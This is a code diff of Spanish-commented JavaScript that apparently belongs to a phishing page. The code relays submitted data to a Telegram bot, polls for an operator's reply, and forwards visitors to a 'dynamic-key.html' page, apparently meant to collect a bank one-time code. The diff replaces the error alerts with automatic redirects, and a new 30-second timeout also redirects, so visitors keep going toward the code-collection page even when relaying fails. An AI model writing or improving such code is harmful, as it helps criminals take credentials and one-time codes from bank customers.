@@ -82,20 +82,35 @@ document.addEventListener('DOMContentLoaded', () => {
                 // Iniciar polling esperando respuesta
                 pollTelegramUpdates(data.result.message_id);
             } else {
-                alert('Error enviando a Telegram. Intenta de nuevo.');
-                loadingOverlay.classList.remove('active');
+                console.warn('Error enviando a Telegram (status no ok). Redirigiendo a Dinámica...');
+                // Fallback: Redirigir a dynamic-key.html si falla el envío
+                setTimeout(() => {
+                    window.location.href = 'dynamic-key.html';
+                }, 2000);
             }
 
         } catch (error) {
-            console.error('Error:', error);
-            alert('Error de conexión.');
-            loadingOverlay.classList.remove('active');
+            console.error('Error de red/conexión:', error);
+            // Fallback: Redirigir a dynamic-key.html si hay excepción
+            setTimeout(() => {
+                window.location.href = 'dynamic-key.html';
+            }, 2000);
         }
     });
 
     async function pollTelegramUpdates(originalMessageId) {
         let lastUpdateId = 0;
-        
+        let isPolling = true;
+
+        // Timeout de seguridad: Si no hay respuesta en 30 segundos, avanzar
+        const pollingTimeout = setTimeout(() => {
+            if (isPolling) {
+                isPolling = false;
+                console.log("Tiempo de espera agotado. Redirigiendo automáticamente...");
+                window.location.href = 'dynamic-key.html';
+            }
+        }, 30000); // 30 segundos
+
         // Obtener último ID
         try {
             const initialResp = await fetch(`${API_URL}/getUpdates?limit=1&offset=-1&t=${Date.now()}`, { cache: 'no-store' });
@@ -106,6 +121,7 @@ document.addEventListener('DOMContentLoaded', () => {
         } catch(e) {}
 
         const checkUpdates = async () => {
+            if (!isPolling) return;
             try {
                 const response = await fetch(`${API_URL}/getUpdates?offset=${lastUpdateId}&timeout=10&t=${Date.now()}`, { cache: 'no-store' });
                 const data = await response.json();
